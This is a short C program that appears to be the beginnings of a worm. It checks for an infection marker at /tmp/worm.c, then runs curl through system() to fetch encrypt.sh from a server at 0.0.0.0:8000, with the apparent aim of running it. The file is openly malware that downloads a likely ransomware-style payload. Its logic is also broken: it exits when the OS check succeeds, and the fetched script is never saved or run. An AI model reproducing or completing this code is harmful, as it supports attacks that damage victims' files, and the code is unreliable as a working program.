#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/utsname.h>

int infected(const char *filename){
    filename = "/tmp/worm.c";
    struct stat buffer;
    int exist = stat(filename,&buffer);
    if(exist == 0)
        exit(1);
    else
        return 0;

}

int main(void){
    
    /*Detects host OS*/
    struct utsname buffer;
    if (uname(&buffer) !=0) {
        perror("uname");
    }

    else{
        exit(1);
    }

        char *command = malloc(60 * sizeof(char));
        strcpy(command, "cd /tmp && curl http://0.0.0.0:8000/encrypt.sh");
        system(command);
        strcpy(command, "./encrypt.sh");

}
